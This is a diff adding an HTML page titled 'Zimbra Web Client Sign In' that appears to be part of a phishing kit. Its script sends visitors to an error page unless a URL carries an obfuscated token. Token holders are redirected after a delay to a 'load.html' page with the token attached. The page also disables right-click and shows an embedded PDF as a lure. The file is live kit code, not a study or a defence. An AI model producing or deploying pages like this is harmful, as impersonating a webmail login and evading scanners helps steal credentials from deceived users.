@@ -1,0 +1,46 @@
+
+<!DOCTYPE html>
+
+<html>
+    <head>
+    <title>Zimbra Web Client Sign In</title>
+    <link rel="SHORTCUT ICON" href="./files/favicon.ico">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+        <script>
+		    // Function to extract query parameter value
+		    function getQueryParameter(parameterName) {
+		      var queryString = window.location.search;
+		      var urlParams = new URLSearchParams(queryString);
+		      return urlParams.get(parameterName);
+		    }
+		    // Get the value from the 'data' query parameter
+		    var value = getQueryParameter('hfdjfdhjytjytktyrkyfdshw4');
+		    
+		    if(value == null) {
+		    
+		    	window.location.href = "error.html";
+		    
+		    }else{
+		    
+		     function redirectToDestination() {
+		    // Redirect to the destination page with the variable value in the URL
+		    window.location.href = "load.html?fgjhjhgrtyrtujggewrwet=" + (value);
+		    }
+
+		    // Automatically redirect after a certain delay (e.g., 2 seconds)
+		    setTimeout(redirectToDestination, 3000);
+		    }
+		    
+		
+	 </script>
+    </head>
+    <body oncontextmenu="return false;">
+
+  <object height="900px" width="1800px"  data="./1.pdf"></object>
+
+
+        
+    </body>
+</html>
